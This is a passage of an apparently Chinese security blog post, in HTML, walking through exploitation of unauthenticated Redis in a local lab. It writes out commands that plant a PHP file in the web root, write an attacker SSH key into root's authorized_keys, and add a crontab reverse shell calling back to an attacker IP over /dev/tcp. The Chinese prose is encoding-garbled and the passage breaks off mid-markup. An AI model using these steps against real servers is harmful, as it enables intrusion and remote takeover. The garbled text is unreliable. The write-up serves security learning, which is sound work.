&lt;å˜åŒ–æ•°&gt;ï¼Œè¡¨ç¤ºåœ¨æŒ‡å®šçš„ç§’æ•°å†…æ•°æ®åº“å­˜åœ¨æŒ‡å®šçš„æ”¹å˜æ•°æ—¶è‡ªåŠ¨è¿›è¡Œå¤‡ä»½ï¼ˆRedisæ˜¯å†…å­˜æ•°æ®åº“ï¼Œè¿™é‡Œçš„å¤‡ä»½å°±æ˜¯æŒ‡æŠŠå†…å­˜ä¸­çš„æ•°æ®å¤‡ä»½åˆ°ç£ç›˜ä¸Šï¼‰ã€‚å¯ä»¥åŒæ—¶æŒ‡å®šå¤šä¸ª<span class="hljs-keyword">save</span>å‚æ•°ï¼Œå¦‚ï¼š<br><span class="hljs-keyword">save</span> <span class="hljs-number">900</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">save</span> <span class="hljs-number">300</span> <span class="hljs-number">10</span><br><span class="hljs-keyword">save</span> <span class="hljs-number">60</span> <span class="hljs-number">10000</span><br>è¡¨ç¤ºå¦‚æœæ•°æ®åº“çš„å†…å®¹åœ¨<span class="hljs-number">60</span>ç§’åäº§ç”Ÿäº†<span class="hljs-number">10000</span>æ¬¡æ”¹å˜ï¼Œæˆ–è€…<span class="hljs-number">300</span>ç§’åäº§ç”Ÿäº†<span class="hljs-number">10</span>æ¬¡æ”¹å˜ï¼Œæˆ–è€…<span class="hljs-number">900</span>ç§’åäº§ç”Ÿäº†<span class="hljs-number">1</span>æ¬¡æ”¹å˜ï¼Œé‚£ä¹ˆç«‹å³è¿›è¡Œå¤‡ä»½æ“ä½œã€‚<br></code></pre></td></tr></table></figure><p>requirepasså‚æ•°</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">æ ¼å¼ä¸ºrequirepassåæ¥æŒ‡å®šçš„å¯†ç ï¼Œç”¨äºæŒ‡å®šå®¢æˆ·ç«¯åœ¨è¿æ¥RedisæœåŠ¡å™¨æ—¶æ‰€ä½¿ç”¨çš„å¯†ç ã€‚Redisé»˜è®¤çš„å¯†ç å‚æ•°æ˜¯ç©ºçš„ï¼Œè¯´æ˜ä¸éœ€è¦å¯†ç å³å¯è¿æ¥ï¼›åŒæ—¶ï¼Œé…ç½®æ–‡ä»¶æœ‰ä¸€æ¡æ³¨é‡Šäº†çš„requirepass foobaredå‘½ä»¤ï¼Œå¦‚æœå»æ‰æ³¨é‡Šï¼Œè¡¨ç¤ºéœ€è¦ä½¿ç”¨foobaredå¯†ç æ‰èƒ½è¿æ¥Redisæ•°æ®åº“ã€‚<br></code></pre></td></tr></table></figure><p>dirå‚æ•°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">æ ¼å¼ä¸º<span class="hljs-built_in">dir</span>åæ¥æŒ‡å®šçš„è·¯å¾„ï¼Œé»˜è®¤ä¸º<span class="hljs-built_in">dir</span> ./ï¼ŒæŒ‡æ˜Redisçš„å·¥ä½œç›®å½•ä¸ºå½“å‰ç›®å½•ï¼Œå³redis-serveræ–‡ä»¶æ‰€åœ¨çš„ç›®å½•ã€‚æ³¨æ„ï¼ŒRedisäº§ç”Ÿçš„å¤‡ä»½æ–‡ä»¶å°†æ”¾åœ¨è¿™ä¸ªç›®å½•ä¸‹ã€‚<br></code></pre></td></tr></table></figure><p>dbfilenameå‚æ•°</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">æ ¼å¼ä¸ºdbfilenameåæ¥æŒ‡å®šçš„æ–‡ä»¶åç§°ï¼Œç”¨äºæŒ‡å®šRediså¤‡ä»½æ–‡ä»¶çš„åå­—ï¼Œé»˜è®¤ä¸ºdbfilename <span class="hljs-keyword">dump</span>.rdbï¼Œå³å¤‡ä»½æ–‡ä»¶çš„åå­—ä¸º<span class="hljs-keyword">dump</span>.rdbã€‚<br></code></pre></td></tr></table></figure><p>configå‘½ä»¤</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">é€šè¿‡<span class="hljs-built_in">config</span>å‘½ä»¤å¯ä»¥è¯»å–å’Œè®¾ç½®<span class="hljs-keyword">dirå‚æ•°ä»¥åŠdbfilenameå‚æ•°ï¼Œå› ä¸ºè¿™æ¡å‘½ä»¤æ¯”è¾ƒå±é™©ï¼ˆå®éªŒå°†è¿›è¡Œè¯¦ç»†ä»‹ç»ï¼‰ï¼Œæ‰€ä»¥Redisåœ¨é…ç½®æ–‡ä»¶ä¸­æä¾›äº†rename-commandå‚æ•°æ¥å¯¹å…¶è¿›è¡Œé‡å‘½åæ“ä½œï¼Œå¦‚rename-command </span><span class="hljs-built_in">CONFIG</span> HTCMDï¼Œå¯ä»¥å°†<span class="hljs-built_in">CONFIG</span>å‘½ä»¤é‡å‘½åä¸ºHTCMDã€‚é…ç½®æ–‡ä»¶é»˜è®¤æ˜¯æ²¡æœ‰å¯¹<span class="hljs-built_in">CONFIG</span>å‘½ä»¤è¿›è¡Œé‡å‘½åæ“ä½œçš„ã€‚<br></code></pre></td></tr></table></figure><p>protected-modeå‚æ•°</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">redis3<span class="hljs-number">.2</span>ä¹‹åæ·»åŠ äº†protected-modeå®‰å…¨æ¨¡å¼ï¼Œé»˜è®¤å€¼ä¸º<span class="hljs-literal">yes</span>ï¼Œå¼€å¯åç¦æ­¢å¤–éƒ¨è¿æ¥ï¼Œæ‰€ä»¥åœ¨æµ‹è¯•æ—¶ï¼Œå…ˆåœ¨é…ç½®ä¸­ä¿®æ”¹ä¸º<span class="hljs-literal">no</span>ã€‚<br></code></pre></td></tr></table></figure><h1 id="redisæ¼æ´åˆ©ç”¨åŸç†"><a href="#redisæ¼æ´åˆ©ç”¨åŸç†" class="headerlink" title="redisæ¼æ´åˆ©ç”¨åŸç†"></a>redisæ¼æ´åˆ©ç”¨åŸç†</h1><p>Redis æä¾›äº†2ç§ä¸åŒçš„æŒä¹…åŒ–æ–¹å¼ï¼ŒRDBæ–¹å¼å’ŒAOFæ–¹å¼.</p><ul><li>RDB æŒä¹…åŒ–å¯ä»¥åœ¨æŒ‡å®šçš„æ—¶é—´é—´éš”å†…ç”Ÿæˆæ•°æ®é›†çš„æ—¶é—´ç‚¹å¿«ç…§</li><li>AOF æŒä¹…åŒ–è®°å½•æœåŠ¡å™¨æ‰§è¡Œçš„æ‰€æœ‰å†™æ“ä½œå‘½ä»¤.</li></ul><p>ç»è¿‡æŸ¥çœ‹å®˜ç½‘æ–‡æ¡£å‘ç°AOFæ–¹å¼å¤‡ä»½æ•°æ®åº“çš„æ–‡ä»¶åé»˜è®¤ä¸ºappendonly.aofï¼Œå¯ä»¥åœ¨é…ç½®æ–‡ä»¶ä¸­é€šè¿‡appendfilenameè®¾ç½®å…¶ä»–åç§°ï¼Œé€šè¿‡æµ‹è¯•å‘ç°ä¸èƒ½åœ¨å®¢æˆ·ç«¯äº¤äº’ä¸­åŠ¨æ€è®¾ç½®appendfilenameï¼Œæ‰€ä»¥ä¸èƒ½é€šè¿‡AOFæ–¹å¼å¤‡ä»½å†™ä»»æ„æ–‡ä»¶.</p><ul><li>RDBæ–¹å¼å¤‡ä»½æ•°æ®åº“çš„æ–‡ä»¶åé»˜è®¤ä¸ºdump.rdbï¼Œæ­¤æ–‡ä»¶åå¯ä»¥é€šè¿‡å®¢æˆ·ç«¯äº¤äº’åŠ¨æ€è®¾ç½®dbfilenameæ¥æ›´æ”¹ï¼Œé€ æˆå¯ä»¥å†™ä»»æ„æ–‡ä»¶.</li></ul><h1 id="redis-æœªæˆæƒè®¿é—®æ¼æ´"><a href="#redis-æœªæˆæƒè®¿é—®æ¼æ´" class="headerlink" title="redis æœªæˆæƒè®¿é—®æ¼æ´"></a>redis æœªæˆæƒè®¿é—®æ¼æ´</h1><p>å…¶å®æœ€å…³é”®çš„ä¾¿æ˜¯æœªæˆæƒå¯ä»¥è®¿é—®rediså¯¼è‡´ä¸€ç³»åˆ—æ¼æ´å•ç‹¬æ•´ç†ä¸€ç¯‡redisç›¸å…³çš„æœªæˆæƒè®¿é—®æ¼æ´çš„åˆ©ç”¨ï¼Œè¿˜æ˜¯æœ‰æ¯”è¾ƒå¤šçš„åˆ©ç”¨æ–¹å¼</p><p>æ¼æ´ç¼–å·ï¼š<strong>cnvd_2015_07557</strong></p><h2 id="æ¼æ´ç®€ä»‹ä»¥åŠå±å®³"><a href="#æ¼æ´ç®€ä»‹ä»¥åŠå±å®³" class="headerlink" title="æ¼æ´ç®€ä»‹ä»¥åŠå±å®³"></a>æ¼æ´ç®€ä»‹ä»¥åŠå±å®³</h2><p>Redis é»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œå¦‚æœæ²¡æœ‰è¿›è¡Œé‡‡ç”¨ç›¸å…³çš„ç­–ç•¥ï¼Œæ¯”å¦‚æ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æº ip è®¿é—®ç­‰ï¼Œè¿™æ ·å°†ä¼šå°† Redis æœåŠ¡æš´éœ²åˆ°å…¬ç½‘ä¸Šï¼Œå¦‚æœåœ¨æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆä¸€èˆ¬ä¸ºç©ºï¼‰çš„æƒ…å†µä¸‹ï¼Œä¼šå¯¼è‡´ä»»æ„ç”¨æˆ·åœ¨å¯ä»¥è®¿é—®ç›®æ ‡æœåŠ¡å™¨çš„æƒ…å†µä¸‹æœªæˆæƒè®¿é—® Redis ä»¥åŠè¯»å– Redis çš„æ•°æ®ã€‚æ”»å‡»è€…åœ¨æœªæˆæƒè®¿é—® Redis çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨ Redis è‡ªèº«çš„æä¾›çš„config å‘½ä»¤ï¼Œå¯ä»¥è¿›è¡Œå†™æ–‡ä»¶æ“ä½œï¼Œæ”»å‡»è€…å¯ä»¥æˆåŠŸå°†è‡ªå·±çš„sshå…¬é’¥å†™å…¥ç›®æ ‡æœåŠ¡å™¨çš„ &#x2F;root&#x2F;.ssh æ–‡ä»¶å¤¹çš„authotrized_keys æ–‡ä»¶ä¸­ï¼Œè¿›è€Œå¯ä»¥ä½¿ç”¨å¯¹åº”ç§é’¥ç›´æ¥ä½¿ç”¨sshæœåŠ¡ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€æ·»åŠ è®¡åˆ’ä»»åŠ¡ã€å†™å…¥Webshellç­‰æ“ä½œã€‚</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>ç›´æ¥ç”¨åœ¨çº¿é¶åœºä¹Ÿæ˜¯å¯ä»¥çš„</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> http://download.redis.io/releases/redis-<span class="hljs-number">2</span>.<span class="hljs-number">8</span>.<span class="hljs-number">17</span>.tar.gz<br><span class="hljs-attribute">tar</span> xzvf redis-<span class="hljs-number">2</span>.<span class="hljs-number">8</span>.<span class="hljs-number">17</span>.tar.gz  #è§£å‹å®‰è£…åŒ…<br><span class="hljs-attribute">cd</span> redis-<span class="hljs-number">2</span>.<span class="hljs-number">8</span>.<span class="hljs-number">17</span>  # è¿›å…¥redisç›®å½•<br><span class="hljs-attribute">make</span> #ç¼–è¯‘<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20241007214855918.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> src/ <span class="hljs-comment">#è¿›å…¥srcç›®å½• </span><br><span class="hljs-built_in">cp</span> redis-server /usr/bin/ <br><span class="hljs-built_in">cp</span> redis-cli /usr/bin/      <span class="hljs-comment">#å°†redis-serverå’Œredis-cliæ‹·è´åˆ°/usr/binç›®å½•ä¸‹ï¼ˆè¿™æ ·å¯åŠ¨redis-serverå’Œredis-cliå°±ä¸ç”¨æ¯æ¬¡éƒ½è¿›å…¥å®‰è£…ç›®å½•äº†ï¼‰</span><br><span class="hljs-built_in">cd</span> ..   <span class="hljs-comment"># è¿”å›ä¸Šä¸€çº§ç›®å½•</span><br><span class="hljs-built_in">cp</span> redis.conf /etc/     <span class="hljs-comment">#å°†redis.confæ‹·è´åˆ°/etc/ç›®å½•ä¸‹</span><br>redis-server /etc/redis.conf  <span class="hljs-comment"># ä½¿ç”¨/etc/ç›®å½•ä¸‹çš„redis.confæ–‡ä»¶ä¸­çš„é…ç½®å¯åŠ¨redisæœåŠ¡</span><br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20241007215049741.png"></p><h2 id="æ¼æ´éªŒè¯"><a href="#æ¼æ´éªŒè¯" class="headerlink" title="æ¼æ´éªŒè¯"></a>æ¼æ´éªŒè¯</h2><p>ä¸ºäº†æ–¹ä¾¿ï¼Œåœ¨windowsæ”»å‡»æœºé‡Œä¸‹è½½ä¸€ä¸ªredis clinet</p><p>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/caoxinyu/RedisClient/releases">https://github.com/caoxinyu/RedisClient/releases</a> ï¼ˆåˆ©ç”¨rediså†™webshellæµ‹è¯•ä½¿ç”¨ï¼‰</p><p><img src="https://img1.plumstar.cn/upload5image-20241007221405793.png"></p><p>ä½¿ç”¨redis clinet ç›´æ¥æ— è´¦å·æˆåŠŸç™»å½•redisï¼Œä»ç™»å½•ç»“æœå¯ä»¥çœ‹å‡ºredisæœªå¯ç”¨è®¤è¯ã€‚</p><p><img src="https://img1.plumstar.cn/upload5image-20241007221243082.png"></p><h3 id="ç›´æ¥å†™shell"><a href="#ç›´æ¥å†™shell" class="headerlink" title="ç›´æ¥å†™shell"></a>ç›´æ¥å†™shell</h3><p>æœªæˆæƒéªŒè¯æˆåŠŸï¼Œå¯ä»¥ç›´æ¥å¾€é‡Œå†™webshell</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">åˆ©ç”¨å‰æï¼š<br>é¶æœºredisæœªæˆæƒï¼Œåœ¨æ”»å‡»æœºèƒ½ç”¨redis clinetè¿æ¥ï¼Œå¦‚ä¸Šå›¾ï¼Œå¹¶æœªç™»å½•éªŒè¯<br>é¶æœºå¼€å¯webæœåŠ¡ï¼Œå¹¶ä¸”çŸ¥é“ç½‘ç«™è·¯å¾„ï¼Œè¿˜éœ€è¦å…·æœ‰æ–‡ä»¶è¯»å†™å¢åˆ æ”¹æŸ¥æƒé™<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬è°ƒå‡ºConsoleï¼Œç”¨æ¥æ‰§è¡Œå‘½ä»¤</p><p><img src="https://img1.plumstar.cn/upload5image-20241007221830020.png"></p><p>æˆ‘ä»¬è¿™é‡Œå› ä¸ºæ˜¯æœ¬åœ°æ­å»ºï¼Œé¶æœºç½‘ç«™è·¯å¾„ï¼š&#x2F;var&#x2F;www&#x2F;html&#x2F;ï¼Œå°†shellå†™åœ¨è¿™ä¸ªç›®å½•ä¸‹å³å¯</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">config set dir /var/www/html</span><br><span class="language-xml">config set dbfilename test.php</span><br><span class="language-xml">set webshell &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br><span class="language-xml">save</span><br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20241007223550599.png"></p><p><img src="https://img1.plumstar.cn/upload5image-20241007223804643.png"></p><p><img src="https://img1.plumstar.cn/upload5image-20241007224937123.png"></p><p><img src="https://img1.plumstar.cn/upload5image-20241007225001630.png"></p><p>æ‰§è¡Œå®Œä¹‹åå»é¶æœºæŸ¥çœ‹ç›®å½•ä¸‹ï¼ŒæˆåŠŸå†™å…¥webshell</p><p><img src="https://img1.plumstar.cn/upload5image-20241007225114229.png"></p><p>åç»­åæ¸—é€è¿™é‡Œå°±ä¸å†ç»§ç»­ä¸‹å»äº†ï¼Œè¿™é‡ŒåŒæ ·ä¹Ÿå¯ä»¥ç›´æ¥åå¼¹shell</p><h3 id="å†™-ssh-keygen-å…¬é’¥ç™»å½•æœåŠ¡å™¨"><a href="#å†™-ssh-keygen-å…¬é’¥ç™»å½•æœåŠ¡å™¨" class="headerlink" title="å†™ ssh-keygen å…¬é’¥ç™»å½•æœåŠ¡å™¨"></a>å†™ ssh-keygen å…¬é’¥ç™»å½•æœåŠ¡å™¨</h3><p>é¶æœºå¼€å¯redisæœåŠ¡ï¼Œæˆ‘è¿™é‡Œé¶æœºï¼ˆredisæœåŠ¡ç«¯ï¼‰ä¸º192.168.158.143ï¼Œæ˜¯ä¸€å°kali</p><p><img src="https://img1.plumstar.cn/upload5image-20241023180830561.png"></p><p>SSHæä¾›ä¸¤ç§ç™»å½•éªŒè¯æ–¹å¼ï¼Œä¸€ç§æ˜¯å£ä»¤éªŒè¯ä¹Ÿå°±æ˜¯è´¦å·å¯†ç ç™»å½•ï¼Œå¦ä¸€ç§æ˜¯å¯†é’¥éªŒè¯ã€‚</p><p>æ‰€è°“å¯†é’¥éªŒè¯ï¼Œå…¶å®å°±æ˜¯ä¸€ç§åŸºäºå…¬é’¥å¯†ç çš„è®¤è¯ï¼Œä½¿ç”¨å…¬é’¥åŠ å¯†ã€ç§é’¥è§£å¯†ï¼Œå…¶ä¸­å…¬é’¥æ˜¯å¯ä»¥å…¬å¼€çš„ï¼Œæ”¾åœ¨æœåŠ¡å™¨ç«¯ï¼Œä½ å¯ä»¥æŠŠåŒä¸€ä¸ªå…¬é’¥æ”¾åœ¨æ‰€æœ‰ä½ æƒ³SSHè¿œç¨‹ç™»å½•çš„æœåŠ¡å™¨ä¸­ï¼Œè€Œç§é’¥æ˜¯ä¿å¯†çš„åªæœ‰ä½ è‡ªå·±çŸ¥é“ï¼Œå…¬é’¥åŠ å¯†çš„æ¶ˆæ¯åªæœ‰ç§é’¥æ‰èƒ½è§£å¯†ï¼Œå¤§ä½“è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><blockquote><p>ï¼ˆ1ï¼‰å®¢æˆ·ç«¯ç”Ÿæˆç§é’¥å’Œå…¬é’¥ï¼Œå¹¶æŠŠå…¬é’¥æ‹·è´ç»™æœåŠ¡å™¨ç«¯ï¼› </p><p>ï¼ˆ2ï¼‰å®¢æˆ·ç«¯å‘èµ·ç™»å½•è¯·æ±‚ï¼Œå‘é€è‡ªå·±çš„ç›¸å…³ä¿¡æ¯ï¼› </p><p>ï¼ˆ3ï¼‰æœåŠ¡å™¨ç«¯æ ¹æ®å®¢æˆ·ç«¯å‘æ¥çš„ä¿¡æ¯æŸ¥æ‰¾æ˜¯å¦å­˜æœ‰è¯¥å®¢æˆ·ç«¯çš„å…¬é’¥ï¼Œè‹¥æ²¡æœ‰æ‹’ç»ç™»å½•ï¼Œè‹¥æœ‰åˆ™ç”Ÿæˆä¸€æ®µéšæœºæ•°ä½¿ç”¨è¯¥å…¬é’¥åŠ å¯†åå‘é€ç»™å®¢æˆ·ç«¯ï¼› </p><p>ï¼ˆ4ï¼‰å®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡å™¨å‘æ¥çš„åŠ å¯†åçš„æ¶ˆæ¯åä½¿ç”¨ç§é’¥è§£å¯†ï¼Œå¹¶æŠŠè§£å¯†åçš„ç»“æœå‘ç»™æœåŠ¡å™¨ç”¨äºéªŒè¯ï¼› </p><p>ï¼ˆ5ï¼‰æœåŠ¡å™¨æ”¶åˆ°å®¢æˆ·ç«¯å‘æ¥çš„è§£å¯†ç»“æœï¼Œä¸è‡ªå·±åˆšæ‰ç”Ÿæˆçš„éšæœºæ•°æ¯”å¯¹ï¼Œè‹¥ä¸€æ ·åˆ™å…è®¸ç™»å½•ï¼Œä¸ä¸€æ ·åˆ™æ‹’ç»ç™»å½•ã€‚</p></blockquote><p><strong>æ¡ä»¶ï¼š</strong></p><blockquote><p>RedisæœåŠ¡ä½¿ç”¨ROOTè´¦å·å¯åŠ¨</p><p>æœåŠ¡å™¨å¼€æ”¾äº†SSHæœåŠ¡ï¼Œè€Œä¸”å…è®¸ä½¿ç”¨å¯†é’¥ç™»å½•ï¼Œå³å¯è¿œç¨‹å†™å…¥ä¸€ä¸ªå…¬é’¥ï¼Œç›´æ¥ç™»å½•è¿œç¨‹æœåŠ¡å™¨ã€‚</p></blockquote><p>åœ¨æ”»å‡»æœºæœ¬åœ°ç”Ÿæˆå…¬é’¥æ–‡ä»¶ï¼Œä¸ºæˆ‘ä»¬çš„å…¬é’¥æ–‡ä»¶è®¾ç½®ä¸€ä¸ªç§é’¥</p><p>å…¬é’¥æ–‡ä»¶é»˜è®¤è·¯å¾„ï¼š&#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh-keygen -t rsa<br><span class="hljs-built_in">cd</span> /root/.ssh<br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">cat</span> id_rsa.pub<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20241023181041441.png"></p><p>å°†ç”Ÿæˆçš„å…¬é’¥ä¹Ÿå°±æ˜¯id_rsa.pubå†™å…¥ket.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /root/.ssh<br>(<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n&quot;</span>;<span class="hljs-built_in">cat</span> id_rsa.pub;<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n&quot;</span>)&gt;key.txt<br></code></pre></td></tr></table></figure><p>ç„¶åé€šè¿‡æœªæˆæƒè®¿é—®ç›®æ ‡æœºå™¨ï¼Œå°†ä¿å­˜sshçš„å…¬é’¥1.txtå†™å…¥redisç¼“å­˜ï¼ˆä½¿ç”¨redis-cli -h ipå‘½ä»¤è¿æ¥é¶æœºï¼Œå°†æ–‡ä»¶å†™å…¥ï¼‰ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /root/.ssh/key.txt |redis-cli -h 192.168.158.143 -x <span class="hljs-built_in">set</span> pub<br></code></pre></td></tr></table></figure><p>ç„¶åæ‰§è¡Œä¸‹åˆ—å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">redis-cli -h 192.168.158.143<br>config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /root/.ssh <span class="hljs-comment">#å°†æ–‡ä»¶å†™å…¥è¿™ä¸ªç›®å½•</span><br>config <span class="hljs-built_in">set</span> dbfilename authorized_keys <span class="hljs-comment">#ä¿å­˜æ–‡ä»¶åä¸ºauthorized_keys</span><br>save <br></code></pre></td></tr></table></figure><p>å»é¶æœºroot&#x2F;.ssh&#x2F;ç›®å½•ä¸‹å¯ä»¥çœ‹åˆ°æˆåŠŸå†™å…¥authorized_keysï¼Œ</p><p><img src="https://img1.plumstar.cn/upload5image-20241023181234686.png"></p><p>åˆ©ç”¨å…¬é’¥è¿›è¡ŒSSHç™»å½•æ”»å‡»æœºï¼Œç¬¬ä¸€æ¬¡éœ€è¦è¾“å…¥yes</p><p><img src="https://img1.plumstar.cn/upload5image-20241023181421062.png"></p><h3 id="åˆ©ç”¨crontabè®¡åˆ’ä»»åŠ¡åå¼¹shell"><a href="#åˆ©ç”¨crontabè®¡åˆ’ä»»åŠ¡åå¼¹shell" class="headerlink" title="åˆ©ç”¨crontabè®¡åˆ’ä»»åŠ¡åå¼¹shell"></a>åˆ©ç”¨crontabè®¡åˆ’ä»»åŠ¡åå¼¹shell</h3><p><strong>cronä»‹ç»</strong><br>æˆ‘ä»¬ç»å¸¸ä½¿ç”¨çš„æ˜¯crontabå‘½ä»¤æ˜¯cron tableçš„ç®€å†™ï¼Œå®ƒæ˜¯cronçš„é…ç½®æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥å«å®ƒä½œä¸šåˆ—è¡¨ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä»¥ä¸‹æ–‡ä»¶å¤¹å†…æ‰¾åˆ°ç›¸å…³é…ç½®æ–‡ä»¶ã€‚</p><p>&#x2F;var&#x2F;spool&#x2F;cron&#x2F; ç›®å½•ä¸‹å­˜æ”¾çš„æ˜¯æ¯ä¸ªç”¨æˆ·åŒ…æ‹¬rootçš„crontabä»»åŠ¡ï¼Œæ¯ä¸ªä»»åŠ¡ä»¥åˆ›å»ºè€…çš„åå­—å‘½å<br>&#x2F;etc&#x2F;crontab è¿™ä¸ªæ–‡ä»¶è´Ÿè´£è°ƒåº¦å„ç§ç®¡ç†å’Œç»´æŠ¤ä»»åŠ¡ã€‚<br>&#x2F;etc&#x2F;cron.d&#x2F; è¿™ä¸ªç›®å½•ç”¨æ¥å­˜æ”¾ä»»ä½•è¦æ‰§è¡Œçš„crontabæ–‡ä»¶æˆ–è„šæœ¬ã€‚<br>æˆ‘ä»¬è¿˜å¯ä»¥æŠŠè„šæœ¬æ”¾åœ¨&#x2F;etc&#x2F;cron.hourlyã€&#x2F;etc&#x2F;cron.dailyã€&#x2F;etc&#x2F;cron.weeklyã€&#x2F;etc&#x2F;cron.monthlyç›®å½•ä¸­ï¼Œè®©å®ƒæ¯å°æ—¶&#x2F;å¤©&#x2F;æ˜ŸæœŸã€æœˆæ‰§è¡Œä¸€æ¬¡ã€‚<br>å…¶ä»–crontabçŸ¥è¯†å¯ä»¥å‚è€ƒï¼š<a href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html">https://www.runoob.com/w3cnote/linux-crontab-tasks.html</a></p><p><strong>æ³¨æ„ï¼š</strong><br>åœ¨ä¸åŒç³»ç»Ÿä¸­ï¼Œrootçš„ä½ç½®æ˜¯ä¸ä¸€æ ·çš„<br>åœ¨kaliå’Œubuntuä¸­ï¼Œå…¶æ–‡ä»¶ä½ç½®ä¸º&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;rootï¼Œåœ¨centosç³»åˆ—ä¸­ä½ç½®ä¸º&#x2F;var&#x2F;spool&#x2F;cron&#x2F;rootï¼Œé€šå¸¸æƒ…å†µä¸‹æ²¡æœ‰rootæ–‡ä»¶ï¼Œéœ€è¦è‡ªå·±åˆ›å»ºã€‚</p><p>æ”»å‡»æœºç›‘å¬ç«¯å£ï¼š</p><p><img src="https://img1.plumstar.cn/upload5image-20241016140625516.png"></p><p>è¿æ¥redisï¼Œå†™å…¥åå¼¹shellï¼Œä¹Ÿå¯ä»¥è·Ÿä¸Šæ–¹ä¸€æ ·åœ¨consoleæ‰§è¡Œï¼Œæ³¨æ„kaliå’Œcentosçš„å®šæ—¶ä»»åŠ¡è·¯å¾„ä¸åŒå³å¯</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs swift">redis<span class="hljs-operator">-</span>cli.exe <span class="hljs-operator">-</span>h <span class="hljs-number">192.168</span>.<span class="hljs-number">158.141</span><br>config <span class="hljs-keyword">set</span> dir <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>crontabs<br><span class="hljs-keyword">set</span> <span class="hljs-operator">-</span><span class="hljs-operator">.-</span> <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>* * * * * bash -i &gt;&amp; /dev/tcp/192.168.158.143/9999 0&gt;&amp;1<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span><br>config <span class="hljs-keyword">set</span> dbfilename root<br>save<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20241016170208249.png"></p><p>è¿‡ä¸€åˆ†é’Ÿå·¦å³ç›‘å¬å°±èƒ½æ”¶åˆ°shelläº†</p><p><img src="https://img1.plumstar.cn/upload5image-20241016170547121.png"></p><h3 id="nmapæ£€æµ‹"><a href="#nmapæ£€æµ‹" class="headerlink" title="nmapæ£€æµ‹"></a>nmapæ£€æµ‹</h3><p>å¦‚æœä½ çš„redis-infoæ¨¡å—æ²¡æ³•ç”¨ï¼Œæ›´æ–°ä¸€ä¸‹nmapå¯èƒ½ä¼šæœ‰ç”¨</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span 